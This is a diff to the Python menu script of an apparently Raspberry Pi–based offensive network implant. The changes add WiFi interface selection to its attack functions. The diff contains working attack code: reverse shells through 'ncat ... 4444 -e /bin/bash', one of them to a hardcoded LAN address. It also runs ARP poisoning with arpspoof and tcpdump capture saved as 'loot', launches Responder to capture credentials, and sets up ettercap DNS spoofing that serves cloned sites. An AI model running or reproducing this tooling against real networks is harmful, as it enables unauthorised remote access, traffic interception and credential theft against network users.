@@ -17,6 +17,53 @@ import signal
 from functools import partial
 import time
 import sys
+
+# WiFi Integration - Add dual interface support
+try:
+    sys.path.append('/root/Raspyjack/wifi/')
+    from wifi.raspyjack_integration import (
+        get_best_interface, 
+        get_interface_ip, 
+        get_interface_network,
+        get_nmap_target_network,
+        get_mitm_interface,
+        get_responder_interface,
+        get_dns_spoof_ip,
+        show_interface_info,
+        set_raspyjack_interface
+    )
+    WIFI_AVAILABLE = True
+    print("✅ WiFi integration loaded - dual interface support enabled")
+except ImportError as e:
+    print(f"⚠️  WiFi integration not available: {e}")
+    print("   Using ethernet-only mode")
+    WIFI_AVAILABLE = False
+    
+    # Fallback functions for ethernet-only mode
+    def get_best_interface():
+        return "eth0"
+    def get_interface_ip(interface):
+        try:
+            return subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'", shell=True).decode().strip().split('/')[0]
+        except:
+            return None
+    def get_nmap_target_network():
+        try:
+            return subprocess.check_output("ip -4 addr show eth0 | awk '/inet / { print $2 }'", shell=True).decode().strip()
+        except:
+            return None
+    def get_mitm_interface():
+        return "eth0"
+    def get_responder_interface():
+        return "eth0"  
+    def get_dns_spoof_ip():
+        try:
+            return subprocess.check_output("ip -4 addr show eth0 | awk '/inet / {split($2, a, \"/\"); print a[1]}'", shell=True).decode().strip()
+        except:
+            return None
+    def set_raspyjack_interface(interface):
+        print(f"⚠️  WiFi integration not available - cannot switch to {interface}")
+        return False
 _stop_evt = threading.Event()
 screen_lock = threading.Event()
 
@@ -636,34 +683,44 @@ def ShowInfo():
     last = []  # Used to get rid of the flicker
     while 1:
         try:
-# Retrieve configuration information for eth0
-            eth0_config = netifaces.ifaddresses("eth0")
-            eth0_ipv4 = eth0_config[netifaces.AF_INET][0]['addr']
-            eth0_subnet_mask = eth0_config[netifaces.AF_INET][0]['netmask']
-            eth0_gateway = netifaces.gateways()["default"][netifaces.AF_INET][0]
-            output = subprocess.check_output("ip addr show dev eth0 | awk '/inet / { print $2 }'", shell=True)
+            # Get best available interface (WiFi or ethernet)
+            interface = get_best_interface()
+            
+            # Retrieve configuration information for active interface
+            interface_config = netifaces.ifaddresses(interface)
+            interface_ipv4 = interface_config[netifaces.AF_INET][0]['addr']
+            interface_subnet_mask = interface_config[netifaces.AF_INET][0]['netmask']
+            interface_gateway = netifaces.gateways()["default"][netifaces.AF_INET][0]
+            output = subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'", shell=True)
             address = output.decode().strip().split('\\')[0]
 
-            if eth0_ipv4:
-# The cable is connected, display configuration information
-                render_array = ["IP:",
-                                eth0_ipv4,
-                                "Subnet:",
-                                eth0_subnet_mask,
-                                "Gateway:",
-                                eth0_gateway,
-                                "Attack:",
-                                 address,]
+            if interface_ipv4:
+                # Connected - display configuration information
+                render_array = [f"Interface: {interface}",
+                                f"IP: {interface_ipv4}",
+                                f"Subnet: {interface_subnet_mask}",
+                                f"Gateway: {interface_gateway}",
+                                f"Attack: {address}",]
+                
+                # Add WiFi-specific info if applicable
+                if interface.startswith('wlan') and WIFI_AVAILABLE:
+                    from wifi.wifi_manager import wifi_manager
+                    status = wifi_manager.get_connection_status(interface)
+                    if status["ssid"]:
+                        render_array.append(f"SSID: {status['ssid']}")
             else:
-# The cable is not connected
-                render_array = ["Cable disconnected"]
+                # Not connected
+                render_array = ["No connection",
+                                f"Interface: {interface}",
+                                "Check network",
+                                "or try WiFi manager"]
         except (KeyError, IndexError, ValueError, OSError):
-            # Gestion des exceptions
+            # Handle exceptions
             render_array = ["                 ",
                             "-----------------",
-                            "Cable disconnected",
-                            "        or       ",
-                            "  DHCP problem  ",
+                            "No network conn.",
+                            "   Try WiFi or   ",
+                            " check ethernet ",
                             "-----------------",
                             "                 ",
                             "                 ",]
@@ -779,15 +836,31 @@ WAIT_TXT = "Scan in progess..."
 def run_scan(label: str, nmap_args: list[str]):
     Dialog_info(f"      {label}\n        Running\n      wait please...", wait=True)
 
-    ip_with_mask = subprocess.check_output("ip -4 addr show eth0 | awk '/inet / { print $2 }'",shell=True).decode().strip()
+    # Get target network from best available interface
+    interface = get_best_interface()
+    ip_with_mask = get_nmap_target_network(interface)
+    
+    if not ip_with_mask:
+        Dialog_info("Network Error\nNo interface available", wait=True)
+        return
 
     ts   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     path = f"/root/Raspyjack/loot/Nmap/{label.lower().replace(' ', '_')}_{ts}.txt"
 
-    subprocess.run(["nmap", *nmap_args, "-oN", path, ip_with_mask])
+    # Build nmap command with interface specification
+    cmd = ["nmap"] + nmap_args + ["-oN", path]
+    
+    # Add interface-specific parameters for better results
+    interface_ip = get_interface_ip(interface)
+    if interface_ip:
+        cmd.extend(["-S", interface_ip, "-e", interface])
+    
+    cmd.append(ip_with_mask)
+    
+    subprocess.run(cmd)
     subprocess.run(["sed", "-i", "s/Nmap scan report for //g", path])
 
-    Dialog_info(f"      {label}\n      Finished !!!", wait=True)
+    Dialog_info(f"      {label}\n      Finished !!!\n   Interface: {interface}", wait=True)
     time.sleep(2)
 
 
@@ -816,17 +889,24 @@ globals().update({
 
 
 def defaut_Reverse():
-    default_ip_bytes = subprocess.check_output("ip addr show dev eth0 | awk '/inet / { print $2 }'|cut -d'.' -f1-3", shell=True)
-    default_ip = default_ip_bytes.decode('utf-8').strip()
-    default_ip_parts = default_ip.split(".")
-    default_ip_prefix = ".".join(default_ip_parts[:3])
-    new_value = GetIpValue(default_ip_prefix)
-    target_ip = f"{default_ip_prefix}.{new_value}"
-    nc_command = ['ncat', target_ip, '4444', '-e', '/bin/bash']
-    print("Reverse launched on " + target_ip + " !!!!!")
-    process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
-    Dialog_info("   Reverse launched !\n   on "+ target_ip , wait=True)
-    time.sleep(2)
+    # Get best available interface and its IP
+    interface = get_best_interface()
+    
+    try:
+        default_ip_bytes = subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'|cut -d'.' -f1-3", shell=True)
+        default_ip = default_ip_bytes.decode('utf-8').strip()
+        default_ip_parts = default_ip.split(".")
+        default_ip_prefix = ".".join(default_ip_parts[:3])
+        new_value = GetIpValue(default_ip_prefix)
+        target_ip = f"{default_ip_prefix}.{new_value}"
+        nc_command = ['ncat', target_ip, '4444', '-e', '/bin/bash']
+        print(f"Reverse launched on {target_ip} via {interface}!!!!!")
+        process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
+        Dialog_info(f"   Reverse launched !\n   on {target_ip}\n   via {interface}", wait=True)
+        time.sleep(2)
+    except Exception as e:
+        Dialog_info(f"Reverse Error\nInterface: {interface}\nNo network?", wait=True)
+        time.sleep(2)
 
 def remote_Reverse():
     nc_command = ['ncat','192.168.1.30','4444', '-e', '/bin/bash']
@@ -842,8 +922,10 @@ def responder_on():
         Dialog_info(" Already running !!!!", wait=True)
         time.sleep(2)
     else:
-        os.system('python3 /root/Raspyjack/Responder/Responder.py -Q -I eth0 &')
-        Dialog_info("     Responder \n      started !!", wait=True)
+        # Get best interface for Responder
+        interface = get_responder_interface()
+        os.system(f'python3 /root/Raspyjack/Responder/Responder.py -Q -I {interface} &')
+        Dialog_info(f"     Responder \n      started !!\n   Interface: {interface}", wait=True)
         time.sleep(2)
 
 def responder_off():
@@ -865,8 +947,11 @@ def get_local_network():
 def Start_MITM():
     safe_kill("arpspoof", "tcpdump")
     Dialog_info("                    Lancement\n                  MITM & Sniff\n                   En cours\n                  Patientez...", wait=True)
+    
+    # Get best interface for MITM attack
+    interface = get_mitm_interface()
     local_network = get_local_network()
-    print(f"[*] Starting MITM attack on local network {local_network}...")
+    print(f"[*] Starting MITM attack on local network {local_network} via {interface}...")
 
 # Scan hosts on the network
     print("[*] Scanning hosts on network...")
@@ -881,18 +966,17 @@ def Start_MITM():
             hosts.append({'ip': parts[0], 'mac': parts[1]})
             print(f"[+] Host: {parts[0]} ({parts[1]})")
 
-
 # Retrieve the gateway IP address
     gateway_ip = get_default_gateway_ip()
     print(f"[*] Default gateway IP: {gateway_ip}")
 
 # If at least one host is found, launch the ARP MITM attack
     if len(hosts) > 1:
-        print("[*] Launching ARP poisoning attack...")
+        print(f"[*] Launching ARP poisoning attack via {interface}...")
         for host in hosts:
             if host['ip'] != gateway_ip:
-                subprocess.Popen(["arpspoof", "-i", "eth0", "-t", gateway_ip, host['ip']])
-                subprocess.Popen(["arpspoof", "-i", "eth0", "-t", host['ip'], gateway_ip])
+                subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway_ip, host['ip']])
+                subprocess.Popen(["arpspoof", "-i", interface, "-t", host['ip'], gateway_ip])
         print("[*] ARP poisoning attack complete.")
 
 # Start tcpdump capture to sniff network traffic
@@ -900,9 +984,9 @@ def Start_MITM():
         pcap_file = f"/root/Raspyjack/loot/MITM/network_traffic_{now}.pcap"
         print(f"[*] Starting tcpdump capture and writing packets to {pcap_file}...")
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-        tcpdump_process = subprocess.Popen(["tcpdump", "-i", "eth0", "-w", pcap_file], stdout=subprocess.PIPE)
+        tcpdump_process = subprocess.Popen(["tcpdump", "-i", interface, "-w", pcap_file], stdout=subprocess.PIPE)
         tcpdump_process.stdout.close()
-        Dialog_info(f" MITM & Sniff\n Sur {len(hosts)-1} hosts !!!", wait=True)
+        Dialog_info(f" MITM & Sniff\n Sur {len(hosts)-1} hosts !!!\n Interface: {interface}", wait=True)
         time.sleep(8)
     else:
         print("[-] No hosts found on network.")
@@ -951,19 +1035,28 @@ ettercap_dns_file = "/etc/ettercap/etter.dns"
 
 
 def Start_DNSSpoofing():
-    # Obtenir automatiquement l'adresse IP de la passerelle
+    # Get best interface for DNS spoofing
+    interface = get_best_interface()
+    
+    # Get gateway and current IP automatically
     gateway_ip = subprocess.check_output("ip route | awk '/default/ {print $3}'", shell=True).decode().strip()
-    current_ip = subprocess.check_output("ip -4 addr show eth0 | awk '/inet / {split($2, a, \"/\"); print a[1]}'", shell=True).decode().strip()
+    current_ip = get_dns_spoof_ip(interface)
+    
+    if not current_ip:
+        Dialog_info("DNS Spoof Error\nNo IP available", wait=True)
+        return
 
 # Escape special characters in the IP address for the sed command
     escaped_ip = current_ip.replace(".", r"\.")
 
-    # Utiliser sed pour modifier les adresses IP dans le fichier etter.dns
+    # Use sed to modify IP addresses in etter.dns file
     sed_command = f"sed -i 's/[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+/{escaped_ip}/g' {ettercap_dns_file}"
     subprocess.run(sed_command, shell=True)
 
     print("------------------------------- ")
     print(f"Site : {site_spoof}")
+    print(f"Interface: {interface}")
+    print(f"IP: {current_ip}")
     print("------------------------------- ")
     print("dns domain spoofed : ")
     dnsspoof_command = f"cat {ettercap_dns_file} | grep -v '#'"
@@ -972,8 +1065,8 @@ def Start_DNSSpoofing():
 
 # Commands executed in the background
     website_command = f"cd /root/Raspyjack/DNSSpoof/sites/{site_spoof} && php -S 0.0.0.0:80"
-    ettercap_command = "ettercap -Tq -M arp:remote -P dns_spoof"
-    Dialog_info(f"    DNS Spoofing\n   {site_spoof}  started !!!", wait=True)
+    ettercap_command = f"ettercap -Tq -M arp:remote -P dns_spoof -i {interface}"
+    Dialog_info(f"    DNS Spoofing\n   {site_spoof}  started !!!\n Interface: {interface}", wait=True)
     time.sleep(2)
 
 # Execution of background commands
@@ -988,6 +1081,239 @@ def Stop_DNSSpoofing():
 
     Dialog_info("    DNS Spoofing\n     stopped !!!", wait=True)
     time.sleep(2)
+
+# WiFi Management Functions
+def launch_wifi_manager():
+    """Launch the FAST WiFi interface."""
+    if not WIFI_AVAILABLE:
+        Dialog_info("WiFi system not found\nRun wifi_manager_payload", wait=True)
+        return
+    
+    Dialog_info("Loading FAST WiFi\nSwitcher...", wait=True)
+    exec_payload("fast_wifi_switcher.py")
+
+def show_interface_info():
+    """Show detailed interface information."""
+    if not WIFI_AVAILABLE:
+        Dialog_info("WiFi system not found", wait=True)
+        return
+        
+    try:
+        from wifi.raspyjack_integration import show_interface_info as show_info
+        
+        # Create a text display of interface info
+        current_interface = get_best_interface()
+        interface_ip = get_interface_ip(current_interface)
+        
+        info_lines = [
+            f"Current: {current_interface}",
+            f"IP: {interface_ip or 'None'}",
+            "",
+            "Press any key to exit"
+        ]
+        
+        if current_interface.startswith('wlan'):
+            try:
+                from wifi.wifi_manager import wifi_manager
+                status = wifi_manager.get_connection_status(current_interface)
+                if status["ssid"]:
+                    info_lines.insert(2, f"SSID: {status['ssid']}")
+            except:
+                pass
+        
+        GetMenuString(info_lines)
+        
+    except Exception as e:
+        Dialog_info(f"Interface Info Error\n{str(e)[:20]}", wait=True)
+
+def switch_interface_menu():
+    """Show interface switching menu with actual switching capability."""
+    if not WIFI_AVAILABLE:
+        Dialog_info("WiFi system not found", wait=True)
+        return
+        
+    try:
+        from wifi.raspyjack_integration import (
+            list_wifi_interfaces_with_status, 
+            get_current_raspyjack_interface,
+            set_raspyjack_interface
+        )
+        
+        # Get current interface
+        current = get_current_raspyjack_interface()
+        
+        # Get WiFi interfaces with status
+        wifi_interfaces = list_wifi_interfaces_with_status()
+        
+        if not wifi_interfaces:
+            Dialog_info("No WiFi interfaces\nfound!", wait=True)
+            return
+        
+        # Create menu with interface status  
+        interface_list = []
+        for iface_info in wifi_interfaces:
+            name = iface_info['name']
+            current_mark = ">" if iface_info['current'] else " "
+            conn_status = "UP" if iface_info['connected'] else "DOWN"
+            ip = iface_info['ip'][:10] if iface_info['ip'] else "No IP"
+            interface_list.append(f"{current_mark} {name} ({conn_status}) {ip}")
+        
+        interface_list.append("")
+        interface_list.append("Select WiFi interface")
+        
+        selection = GetMenuString(interface_list)
+        
+        if selection and not selection.startswith("Select") and selection.strip() and not selection.startswith(" "):
+            # Extract interface name from selection
+            parts = selection.split()
+            if len(parts) >= 2:
+                selected_iface = parts[1]  # Get the wlan0/wlan1 part
+                
+                if selected_iface.startswith('wlan'):
+                    Dialog_info(f"Switching to\n{selected_iface}\nConfiguring routes...", wait=True)
+                    
+                    # Actually perform the switch
+                    success = set_raspyjack_interface(selected_iface)
+                    
+                    if success:
+                        Dialog_info(f"✓ SUCCESS!\nRaspyJack now using\n{selected_iface}\nAll tools updated", wait=True)
+                    else:
+                        Dialog_info(f"✗ FAILED!\nCould not switch to\n{selected_iface}\nCheck connection", wait=True)
+        
+    except Exception as e:
+        Dialog_info(f"Switch Error\n{str(e)[:20]}", wait=True)
+
+def show_routing_status():
+    """Show current routing status."""
+    if not WIFI_AVAILABLE:
+        Dialog_info("WiFi system not found", wait=True)
+        return
+        
+    try:
+        from wifi.raspyjack_integration import get_current_default_route
+        
+        current_route = get_current_default_route()
+        current_interface = get_best_interface()
+        
+        if current_route:
+            info_lines = [
+                "Routing Status:",
+                f"Default: {current_route.get('interface', 'unknown')}",
+                f"Gateway: {current_route.get('gateway', 'unknown')}",
+                f"RaspyJack uses: {current_interface}",
+                "",
+                "Press any key to exit"
+            ]
+        else:
+            info_lines = [
+                "Routing Status:",
+                "No default route found",
+                f"RaspyJack uses: {current_interface}",
+                "",
+                "Press any key to exit"
+            ]
+        
+        GetMenuString(info_lines)
+        
+    except Exception as e:
+        Dialog_info(f"Routing Error\n{str(e)[:20]}", wait=True)
+
+def switch_to_wifi():
+    """Switch system to use WiFi as primary interface."""
+    if not WIFI_AVAILABLE:
+        Dialog_info("WiFi system not found", wait=True)
+        return
+        
+    try:
+        from wifi.raspyjack_integration import get_available_interfaces, ensure_interface_default
+        
+        # Find WiFi interfaces
+        interfaces = get_available_interfaces()
+        wifi_interfaces = [iface for iface in interfaces if iface.startswith('wlan')]
+        
+        if not wifi_interfaces:
+            Dialog_info("No WiFi interfaces\nfound", wait=True)
+            return
+        
+        # Use first available WiFi interface
+        wifi_iface = wifi_interfaces[0]
+        Dialog_info(f"Switching to WiFi\n{wifi_iface}\nPlease wait...", wait=True)
+        
+        success = ensure_interface_default(wifi_iface)
+        
+        if success:
+            Dialog_info(f"✓ Switched to WiFi\n{wifi_iface}\nAll tools use WiFi", wait=True)
+        else:
+            Dialog_info(f"✗ Switch failed\nCheck WiFi connection", wait=True)
+            
+    except Exception as e:
+        Dialog_info(f"WiFi Switch Error\n{str(e)[:20]}", wait=True)
+
+def switch_to_ethernet():
+    """Switch system to use Ethernet as primary interface."""
+    if not WIFI_AVAILABLE:
+        Dialog_info("WiFi system not found", wait=True)
+        return
+        
+    try:
+        from wifi.raspyjack_integration import ensure_interface_default
+        
+        Dialog_info("Switching to Ethernet\neth0\nPlease wait...", wait=True)
+        
+        success = ensure_interface_default("eth0")
+        
+        if success:
+            Dialog_info("✓ Switched to Ethernet\neth0\nAll tools use ethernet", wait=True)
+        else:
+            Dialog_info("✗ Switch failed\nCheck ethernet connection", wait=True)
+            
+    except Exception as e:
+        Dialog_info(f"Ethernet Switch Error\n{str(e)[:20]}", wait=True)
+
+def launch_interface_switcher():
+    """Launch the interface switcher payload."""
+    if not WIFI_AVAILABLE:
+        Dialog_info("WiFi system not found", wait=True)
+        return
+    
+    Dialog_info("Loading Interface\nSwitcher...", wait=True)
+    exec_payload("interface_switcher_payload.py")
+
+def quick_wifi_toggle():
+    """FAST toggle between wlan0 and wlan1 - immediate switching."""
+    if not WIFI_AVAILABLE:
+        Dialog_info("WiFi system not found", wait=True)
+        return
+        
+    try:
+        from wifi.raspyjack_integration import (
+            get_current_raspyjack_interface,
+            set_raspyjack_interface
+        )
+        
+        current = get_current_raspyjack_interface()
+        
+        # Determine target interface immediately
+        if current == 'wlan0':
+            target = 'wlan1'
+        elif current == 'wlan1':
+            target = 'wlan0'
+        else:
+            # Default to wlan1 if not using either
+            target = 'wlan1'
+        
+        Dialog_info(f"FAST SWITCH:\n{current} -> {target}\nSwitching now...", wait=True)
+        
+        # IMMEDIATE switch with force
+        success = set_raspyjack_interface(target)
+        
+        if success:
+            Dialog_info(f"✓ SWITCHED!\n{target} active\n\nAll tools now\nuse {target}", wait=True)
+        else:
+            Dialog_info(f"✗ FAILED!\n{target} not ready\nCheck connection", wait=True)
+            
+    except Exception as e:
+        Dialog_info(f"Error: {str(e)[:20]}", wait=True)
 
 
 def list_payloads():
@@ -1094,6 +1420,7 @@ class DisposableMenu:
             [" MITM & Sniff",   "ai"],     # i
             [" DNS Spoofing",   "aj"],     # j
             [" Network info",   ShowInfo], # appel direct
+            [" WiFi Manager",   "aw"],     # w
             [" Other features", "ag"],     # g
             [" Read file",      "ah"],     # h
             [" Payload", "ap"],            # p
@@ -1160,8 +1487,23 @@ class DisposableMenu:
         "ak": tuple(
             [f" {site}", partial(spoof_site, site)]
             for site in SITES
+        ),
 
+        "aw": (
+            [" FAST WiFi Switcher", launch_wifi_manager],
+            [" INSTANT Toggle 0↔1", quick_wifi_toggle],
+            [" Switch Interface", switch_interface_menu],
+            [" Show Interface Info", show_interface_info],  
+            [" Route Control", "awr"],
+        ) if WIFI_AVAILABLE else (
+            [" WiFi Not Available", lambda: Dialog_info("WiFi system not found\nRun wifi_manager_payload", wait=True)],
+        ),
 
+        "awr": (
+            [" Show Routing Status", show_routing_status],
+            [" Switch to WiFi", switch_to_wifi],
+            [" Switch to Ethernet", switch_to_ethernet],
+            [" Interface Switcher", launch_interface_switcher]
         ),
     }
 
@@ -1231,6 +1573,7 @@ LCD_Config.Driver_Delay_ms(5)  # 8
 image = Image.open(default.install_path + 'img/logo.bmp')
 LCD.LCD_ShowImage(image, 0, 0)
 
+# Create draw objects BEFORE main() so color functions can use them
 image = Image.new("RGB", (LCD.width, LCD.height), "WHITE")
 draw = ImageDraw.Draw(image)
 font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', 8)
